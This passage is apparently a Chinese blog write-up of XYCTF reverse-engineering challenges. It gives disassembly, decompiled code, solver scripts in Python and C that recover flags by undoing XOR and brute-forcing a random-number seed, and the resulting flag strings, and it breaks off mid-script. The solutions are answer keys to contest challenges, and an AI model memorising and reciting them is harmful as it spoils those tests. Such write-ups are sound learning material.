int     <span class="number">21</span>h             ; DOS - BUFFERED KEYBOARD INPUT</span><br><span class="line">seg001:<span class="number">0013</span>                                         ; DS:DX <span class="punctuation">-&gt;</span> buffer</span><br><span class="line">seg001:<span class="number">0015</span>                 lea     dx, unk_10010</span><br><span class="line">seg001:<span class="number">0019</span>                 mov     ah, <span class="number">9</span></span><br><span class="line">seg001:<span class="number">001</span>B                 int     <span class="number">21</span>h             ; DOS - PRINT STRING</span><br><span class="line">seg001:<span class="number">001</span>B                                         ; DS:DX <span class="punctuation">-&gt;</span> string terminated by <span class="string">&quot;$&quot;</span></span><br><span class="line">seg001:<span class="number">001</span>D                 xor     cx, cx</span><br><span class="line">seg001:<span class="number">001</span>F                 xor     ax, ax</span><br><span class="line">seg001:<span class="number">0021</span>                 mov     cl, byte_1002E</span><br><span class="line">seg001:<span class="number">0025</span>                 mov     si, <span class="number">2</span>Fh ; <span class="string">&#x27;/&#x27;</span></span><br><span class="line">seg001:<span class="number">0028</span>                 mov     al, [si]</span><br><span class="line">seg001:<span class="number">002</span>A                 add     si, cx</span><br><span class="line">seg001:<span class="number">002</span>C</span><br><span class="line">seg001:<span class="number">002</span>C loc_1007C:                              ; CODE XREF: start+<span class="number">37</span>↓j</span><br><span class="line">seg001:<span class="number">002</span>C                 sub     si, <span class="number">1</span></span><br><span class="line">seg001:<span class="number">002</span>F                 xor     [si], al</span><br><span class="line">seg001:<span class="number">0031</span>                 mov     al, [si]</span><br><span class="line">seg001:<span class="number">0033</span>                 dec     cx</span><br><span class="line">seg001:<span class="number">0034</span>                 cmp     cx, <span class="number">0</span></span><br><span class="line">seg001:<span class="number">0037</span>                 jnz     short loc_1007C</span><br><span class="line">seg001:<span class="number">0039</span>                 lea     si, unk_1002F</span><br><span class="line">seg001:<span class="number">003</span>D                 lea     di, unk_10019<span class="comment">///////</span></span><br><span class="line">seg001:<span class="number">0041</span></span><br><span class="line">seg001:<span class="number">0041</span> loc_10091:                              ; CODE XREF: start+<span class="number">50</span>↓j</span><br><span class="line">seg001:<span class="number">0041</span>                 mov     al, [si]</span><br><span class="line">seg001:<span class="number">0043</span>                 mov     bl, [di]</span><br><span class="line">seg001:<span class="number">0045</span>                 add     si, <span class="number">1</span></span><br><span class="line">seg001:<span class="number">0048</span>                 inc     di</span><br><span class="line">seg001:<span class="number">0049</span>                 cmp     al, bl</span><br><span class="line">seg001:<span class="number">004</span>B                 jnz     short loc_100AA</span><br><span class="line">seg001:<span class="number">004</span>D                 cmp     cx, <span class="number">0</span></span><br><span class="line">seg001:<span class="number">0050</span>                 jnz     short loc_10091</span><br><span class="line">seg001:<span class="number">0052</span>                 lea     dx, unk_10013</span><br><span class="line">seg001:<span class="number">0056</span>                 mov     ah, <span class="number">9</span></span><br><span class="line">seg001:<span class="number">0058</span>                 int     <span class="number">21</span>h             ; DOS - PRINT STRING</span><br><span class="line">seg001:<span class="number">0058</span>                                         ; DS:DX <span class="punctuation">-&gt;</span> string terminated by <span class="string">&quot;$&quot;</span></span><br><span class="line">seg001:<span class="number">005</span>A</span><br><span class="line">seg001:<span class="number">005</span>A loc_100AA:                              ; CODE XREF: start+<span class="number">4</span>B↑j</span><br><span class="line">seg001:<span class="number">005</span>A                 mov     ah, <span class="number">4</span>Ch</span><br><span class="line">seg001:<span class="number">005</span>C                 int     <span class="number">21</span>h             ; DOS - <span class="number">2</span>+ - QUIT WITH EXIT <span class="title function_ invoke__">CODE</span> (EXIT)</span><br><span class="line">seg001:<span class="number">005</span>C start           endp                    ; AL = exit code</span><br><span class="line">seg001:<span class="number">005</span>C</span><br><span class="line">seg001:<span class="number">005</span>C seg001          ends</span><br></pre></td></tr></table></figure><p>没有找到其他方法，硬读汇编qwq<br>输入—-每一位与后面一位异或—–与d数组比对。<br>#看到说是循环异或</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240428202306830.png" alt="image-20240428202306830"></p><p>解密：（最后一个没出，但是可能和第一个异或？</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">0x76</span>, <span class="number">0x0E</span>, <span class="number">0x77</span>, <span class="number">0x14</span>, <span class="number">0x60</span>, <span class="number">0x06</span>, <span class="number">0x7D</span>, <span class="number">0x04</span>, <span class="number">0x6B</span>, <span class="number">0x1E</span>, <span class="number">0x41</span>,</span><br><span class="line"><span class="number">0x2A</span>, <span class="number">0x44</span>, <span class="number">0x2B</span>, <span class="number">0x5C</span>, <span class="number">0x03</span>, <span class="number">0x3B</span>, <span class="number">0x0B</span>, <span class="number">0x33</span>, <span class="number">0x05</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher) - <span class="number">1</span>):</span><br><span class="line">cipher[i] = cipher[i] ^ cipher[i + <span class="number">1</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#print(flag)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line"><span class="keyword">if</span> i != (<span class="built_in">len</span>(cipher) - <span class="number">1</span>):</span><br><span class="line">flag += <span class="built_in">chr</span>(cipher[i])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(cipher[i] ^ cipher[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># xyctf&#123;you_know_8086&#125;</span></span><br></pre></td></tr></table></figure><p>#放个16位<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240428204644536.png" alt="image-20240428204644536"></p><h2 id="2-Debugme"><a href="#2-Debugme" class="headerlink" title="2.Debugme"></a>2.Debugme</h2><h5 id="动态调试apk"><a href="#动态调试apk" class="headerlink" title="动态调试apk"></a>动态调试apk</h5><p>说是动态调试apk</p><blockquote><p><a href="http://t.csdnimg.cn/Xk9op">http://t.csdnimg.cn/Xk9op</a><br>1、jeb打开apk，分析源码，下好断点；<br> 2、启动模拟器，安装好apk；<br> 3、adb命令连接模拟器，启动apk，adb shell am start -D -n （包名）&#x2F;（.主窗体）<br> 4、jeb附加对应的进程，开始愉快的调试。</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am <span class="built_in">start</span> -D -n com.xyctf.ezapk/.MainActivity</span><br></pre></td></tr></table></figure><h2 id="3-Trustme"><a href="#3-Trustme" class="headerlink" title="3.*Trustme"></a>3.*Trustme</h2><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>#放个jadx支持的文件种类：apk、dex、jar、zip、class、aar</p><p><a href="http://t.csdnimg.cn/35N5aadb%E8%BF%9E%E6%8E%A5MuMu%E3%80%81%E9%80%8D%E9%81%A5%E3%80%81%E5%A4%9C%E7%A5%9E%E3%80%81%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%BB%A5%E5%8F%8A%E8%85%BE%E8%AE%AF%E6%89%8B%E6%B8%B8%E5%8A%A9%E6%89%8B%E4%BB%A5%E5%8F%8A%E6%96%AD%E5%BC%80%E8%BF%9E%E6%8E%A5_%E9%9B%B7%E7%94%B5adb%E8%BF%9E%E6%8E%A5%E5%9C%B0%E5%9D%80-CSDN%E5%8D%9A%E5%AE%A2">http://t.csdnimg.cn/35N5aadb连接MuMu、逍遥、夜神、雷电模拟器以及腾讯手游助手以及断开连接_雷电adb连接地址-CSDN博客</a></p><p>？放一下</p><h2 id="4-ez-cube"><a href="#4-ez-cube" class="headerlink" title="4.ez_cube"></a>4.ez_cube</h2><h5 id="模拟-拧魔方？"><a href="#模拟-拧魔方？" class="headerlink" title="模拟+拧魔方？"></a>模拟+拧魔方？</h5><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240428222750041.png" alt="image-20240428222750041"></p><p>分别是面颜色–现在状态–操作行为</p><p>#拿着魔方拧一下</p><p>cmp函数是验证是否复原，以及复原步骤是否&lt;&#x3D;12</p><p>拿魔方手操：RuRURURuruRR</p><h2 id="5-今夕是何年"><a href="#5-今夕是何年" class="headerlink" title="5.今夕是何年"></a>5.今夕是何年</h2><h5 id="龙芯loongarch"><a href="#龙芯loongarch" class="headerlink" title="龙芯loongarch"></a>龙芯loongarch</h5><p>#<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240428222956978.png" alt="image-20240428222956978"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240428223006225.png" alt="image-20240428223006225"></p><h2 id="6-baby-unity"><a href="#6-baby-unity" class="headerlink" title="6.*baby unity"></a>6.*baby unity</h2><p>好难</p><h2 id="7-ez-rand"><a href="#7-ez-rand" class="headerlink" title="7.ez_rand"></a>7.ez_rand</h2><h5 id="随机数种子"><a href="#随机数种子" class="headerlink" title="随机数种子"></a>随机数种子</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v4; <span class="comment">// ax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// edi</span></span><br><span class="line">  __int64 v6; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v9[<span class="number">7</span>]; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+3Ch] [rbp-34h]</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+3Dh] [rbp-33h]</span></span><br><span class="line">  __int128 v12; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+5Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+5Eh] [rbp-12h]</span></span><br><span class="line"></span><br><span class="line">  v13 = <span class="number">0</span>i64;</span><br><span class="line">  v12 = <span class="number">0</span>i64;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  sub_140001020(<span class="string">&quot;请输入flag:&quot;</span>);</span><br><span class="line">  sub_140001080(<span class="string">&quot;%s&quot;</span>);</span><br><span class="line">  v9[<span class="number">0</span>] = <span class="number">0xEA6C0C5D</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">-1</span>i64;</span><br><span class="line">  v9[<span class="number">1</span>] = <span class="number">0x34FC1946</span>;</span><br><span class="line">  v9[<span class="number">2</span>] = <span class="number">0x72362B2</span>;</span><br><span class="line">  v9[<span class="number">3</span>] = <span class="number">0xFB6E2262</span>;</span><br><span class="line">  v9[<span class="number">4</span>] = <span class="number">0xA9F2E8B4</span>;</span><br><span class="line">  v9[<span class="number">5</span>] = <span class="number">0x86211291</span>;</span><br><span class="line">  v9[<span class="number">6</span>] = <span class="number">0x43E98EDB</span>;</span><br><span class="line">  v10 = <span class="number">77</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v3;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)&amp;v12 + v3) );</span><br><span class="line">  v4 = time64(<span class="number">0</span>i64);</span><br><span class="line">  srand(v4);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = rand();</span><br><span class="line">      <span class="keyword">if</span> ( (*((_BYTE *)&amp;v12 + v6) ^ (<span class="type">unsigned</span> __int8)(v7</span><br><span class="line">                                                    + ((((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span>i64 * v7) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>i64)</span><br><span class="line">                                                    + ((<span class="type">int</span>)((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span>i64 * v7) &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">7</span>))) != *((_BYTE *)v9 + v6) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_140001020(<span class="string">&quot;Error???\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      ++v5;</span><br><span class="line">      ++v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 &lt; v3 );</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140001020(<span class="string">&quot;Right???\n&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v4是种子，srand函数和rand函数根据种子来生成随机数，input加密逻辑使用v7</p><p>那么首先想到的是爆破种子，来推flag</p><p>再看v4，<strong>unsigned __int16 v4</strong>无符号16位整数型，v4范围为0~2**16-1(65535)，结合flag固定格式</p><p>XYCTF{}</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">containsXYCTF</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(str, <span class="string">&quot;XYCTF&quot;</span>) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 包含&quot;XYCTF&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 不包含&quot;XYCTF&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cipher[<span class="number">29</span>] = &#123;<span class="number">0x5D</span>, <span class="number">0x0C</span>, <span class="number">0x6C</span>, <span class="number">0xEA</span>, <span class="number">0x46</span>, <span class="number">0x19</span>, <span class="number">0xFC</span>, <span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xB2</span>, <span class="number">0x62</span>, <span class="number">0x23</span>, <span class="number">0x07</span>, <span class="number">0x62</span>, <span class="number">0x22</span>, <span class="number">0x6E</span>, <span class="number">0xFB</span>, <span class="number">0xB4</span>, <span class="number">0xE8</span>, <span class="number">0xF2</span>, <span class="number">0xA9</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0x12</span>, <span class="number">0x21</span>, <span class="number">0x86</span>, <span class="number">0xDB</span>, <span class="number">0x8E</span>, <span class="number">0xE9</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v7;</span><br><span class="line"><span class="type">char</span> flag[<span class="number">29</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> seed = <span class="number">0</span>; seed &lt; <span class="number">65536</span>; seed++)</span><br><span class="line">&#123;</span><br><span class="line">srand(seed);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v7 = rand();</span><br><span class="line"><span class="type">int</span> num = (<span class="type">int</span>)((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span> * v7) &gt;&gt; <span class="number">32</span>);</span><br><span class="line"><span class="type">unsigned</span> __int8 data = (<span class="type">unsigned</span> __int8)(v7 + ((num &amp; <span class="number">0x80000000</span>) !=</span><br><span class="line"><span class="number">0</span>) + (num &gt;&gt; <span class="number">7</span>));</span><br><span class="line">flag[i] = cipher[i] ^ data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (containsXYCTF(flag))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;success\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;seed = %d\n&quot;</span>, seed);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// seed = 21308</span></span><br><span class="line"><span class="comment">// XYCTF&#123;R@nd_1s_S0_S0_S0_easy!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="8-何须相思煮余年"><a href="#8-何须相思煮余年" class="headerlink" title="8.何须相思煮余年"></a>8.何须相思煮余年</h2><h5 id="转汇编，去花指令"><a href="#转汇编，去花指令" class="headerlink" title="转汇编，去花指令"></a>转汇编，去花指令</h5><p>一堆十六进制应该是要转汇编</p><p>朝的脚本转二进制：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">hex_data = <span class="string">&quot;0x55 0x8b 0xec 0x81 0xec 0xa8 0x0 0x0 0x0 0xa1 0x0 0x40 0x41 0x0</span></span><br><span class="line"><span class="string">0x33 0xc5 0x89 0x45 0xfc 0x68 0x9c 0x0 0x0 0x0 0x6a 0x0 0x8d 0x85 0x60 0xff 0xff</span></span><br><span class="line"><span class="string">0xff 0x50 0xe8 0x7a 0xc 0x0 0x0 0x83 0xc4 0xc 0xc7 0x85 0x58 0xff 0xff 0xff 0x27</span></span><br><span class="line"><span class="string">0x0 0x0 0x0 0xc7 0x85 0x5c 0xff 0xff 0xff 0x0 0x0 0x0 0x0 0xeb 0xf 0x8b 0x8d 0x5c</span></span><br><span class="line"><span class="string">0xff 0xff 0xff 0x83 0xc1 0x1 0x89 0x8d 0x5c 0xff 0xff 0xff 0x83 0xbd 0x5c 0xff</span></span><br><span class="line"><span class="string">0xff 0xff 0x27 0xf 0x8d 0xed 0x0 0x0 0x0 0x8b 0x95 0x5c 0xff 0xff 0xff 0x81 0xe2</span></span><br><span class="line"><span class="string">0x3 0x0 0x0 0x80 0x79 0x5 0x4a 0x83 0xca 0xfc 0x42 0x85 0xd2 0x75 0x25 0x8b 0x85</span></span><br><span class="line"><span class="string">0x5c 0xff 0xff 0xff 0x8b 0x8c 0x85 0x60 0xff 0xff 0xff 0x3 0x8d 0x5c 0xff 0xff</span></span><br><span class="line"><span class="string">0xff 0x8b 0x95 0x5c 0xff 0xff 0xff 0x89 0x8c 0x95 0x60 0xff 0xff 0xff 0xe9 0xac</span></span><br><span class="line"><span class="string">0x0 0x0 0x0 0x8b 0x85 0x5c 0xff 0xff 0xff 0x25 0x3 0x0 0x0 0x80 0x79 0x5 0x48</span></span><br><span class="line"><span class="string">0x83 0xc8 0xfc 0x40 0x83 0xf8 0x1 0x75 0x22 0x8b 0x8d 0x5c 0xff 0xff 0xff 0x8b</span></span><br><span class="line"><span class="string">0x94 0x8d 0x60 0xff 0xff 0xff 0x2b 0x95 0x5c 0xff 0xff 0xff 0x8b 0x85 0x5c 0xff</span></span><br><span class="line"><span class="string">0xff 0xff 0x89 0x94 0x85 0x60 0xff 0xff 0xff 0xeb 0x73 0x8b 0x8d 0x5c 0xff 0xff</span></span><br><span class="line"><span class="string">0xff 0x81 0xe1 0x3 0x0 0x0 0x80 0x79 0x5 0x49 0x83 0xc9 0xfc 0x41 0x83 0xf9 0x2</span></span><br><span class="line"><span class="string">0x75 0x23 0x8b 0x95 0x5c 0xff 0xff 0xff 0x8b 0x84 0x95 0x60 0xff 0xff 0xff 0xf</span></span><br><span class="line"><span class="string">0xaf 0x85 0x5c 0xff 0xff 0xff 0x8b 0x8d 0x5c 0xff 0xff 0xff 0x89 0x84 0x8d 0x60</span></span><br><span class="line"><span class="string">0xff 0xff 0xff 0xeb 0x38 0x8b 0x95 0x5c 0xff 0xff 0xff 0x81 0xe2 0x3 0x0 0x0 0x80</span></span><br><span class="line"><span class="string">0x79 0x5 0x4a 0x83 0xca 0xfc 0x42 0x83 0xfa 0x3 0x75 0x20 0x8b 0x85 0x5c 0xff</span></span><br><span class="line"><span class="string">0xff 0xff 0x8b 0x8c 0x85 0x60 0xff 0xff 0xff 0x33 0x8d 0x5c 0xff 0xff 0xff 0x8b</span></span><br><span class="line"><span class="string">0x95 0x5c 0xff 0xff 0xff 0x89 0x8c 0x95 0x60 0xff 0xff 0xff 0xe9 0xf7 0xfe 0xff</span></span><br><span class="line"><span class="string">0xff 0x33 0xc0 0x8b 0x4d 0xfc 0x33 0xcd 0xe8 0x4 0x0 0x0 0x0 0x8b 0xe5 0x5d</span></span><br><span class="line"><span class="string">0xc3&quot;</span></span><br><span class="line"><span class="comment"># 去除空格并将十六进制数据字符串分割成十六进制值的列表</span></span><br><span class="line">hex_values = hex_data.split()</span><br><span class="line"><span class="comment"># 将每个十六进制值转换为相应的整数值</span></span><br><span class="line">int_values = [<span class="built_in">int</span>(value, <span class="number">16</span>) <span class="keyword">for</span> value <span class="keyword">in</span> hex_values]</span><br><span class="line"><span class="comment"># 将整数值列表转换为字节</span></span><br><span class="line">binary_data = <span class="built_in">bytes</span>(int_values)</span><br><span class="line"><span class="comment"># 将二进制数据写入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(binary_data)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">code =</span><br><span class="line"><span class="string">b&#x27;\x55\x8b\xec\x81\xec\xa8\x00\x00\x00\xa1\x00\x40\x41\x00\x33\xc5\x89\x</span></span><br><span class="line"><span class="string">45\xfc\x68\x9c\x00\x00\x00\x6a\x00\x8d\x85\x60\xff\xff\xff\x50\xe8\x7a\x</span></span><br><span class="line"><span class="string">0c\x00\x00\x83\xc4\x0c\xc7\x85\x58\xff\xff\xff\x27\x00\x00\x00\xc7\x85\x</span></span><br><span class="line"><span class="string">5c\xff\xff\xff\x00\x00\x00\x00\xeb\x0f\x8b\x8d\x5c\xff\xff\xff\x83\xc1\x</span></span><br><span class="line"><span class="string">01\x89\x8d\x5c\xff\xff\xff\x83\xbd\x5c\xff\xff\xff\x27\x0f\x8d\xed\x00\x</span></span><br><span class="line"><span class="string">00\x00\x8b\x95\x5c\xff\xff\xff\x81\xe2\x03\x00\x00\x80\x79\x05\x4a\x83\x</span></span><br><span class="line"><span class="string">ca\xfc\x42\x85\xd2\x75\x25\x8b\x85\x5c\xff\xff\xff\x8b\x8c\x85\x60\xff\x</span></span><br><span class="line"><span class="string">ff\xff\x03\x8d\x5c\xff\xff\xff\x8b\x95\x5c\xff\xff\xff\x89\x8c\x95\x60\x</span></span><br><span class="line"><span class="string">ff\xff\xff\xe9\xac\x00\x00\x00\x8b\x85\x5c\xff\xff\xff\x25\x03\x00\x00\x</span></span><br><span class="line"><span class="string">80\x79\x05\x48\x83\xc8\xfc\x40\x83\xf8\x01\x75\x22\x8b\x8d\x5c\xff\xff\x</span></span><br><span class="line"><span class="string">ff\x8b\x94\x8d\x60\xff\xff\xff\x2b\x95\x5c\xff\xff\xff\x8b\x85\x5c\xff\x</span></span><br><span class="line"><span class="string">ff\xff\x89\x94\x85\x60\xff\xff\xff\xeb\x73\x8b\x8d\x5c\xff\xff\xff\x81\x</span></span><br><span class="line"><span class="string">e1\x03\x00\x00\x80\x79\x05\x49\x83\xc9\xfc\x41\x83\xf9\x02\x75\x23\x8b\x</span></span><br><span class="line"><span class="string">95\x5c\xff\xff\xff\x8b\x84\x95\x60\xff\xff\xff\x0f\xaf\x85\x5c\xff\xff\x</span></span><br><span class="line"><span class="string">ff\x8b\x8d\x5c\xff\xff\xff\x89\x84\x8d\x60\xff\xff\xff\xeb\x38\x8b\x95\x</span></span><br><span class="line"><span class="string">5c\xff\xff\xff\x81\xe2\x03\x00\x00\x80\x79\x05\x4a\x83\xca\xfc\x42\x83\x</span></span><br><span class="line"><span class="string">fa\x03\x75\x20\x8b\x85\x5c\xff\xff\xff\x8b\x8c\x85\x60\xff\xff\xff\x33\x</span></span><br><span class="line"><span class="string">8d\x5c\xff\xff\xff\x8b\x95\x5c\xff\xff\xff\x89\x8c\x95\x60\xff\xff\xff\x</span></span><br><span class="line"><span class="string">e9\xf7\xfe\xff\xff\x33\xc0\x8b\x4d\xfc\x33\xcd\xe8\x04\x00\x00\x00\x8b\x</span></span><br><span class="line"><span class="string">e5\x5d\xc3&#x27;</span></span><br><span 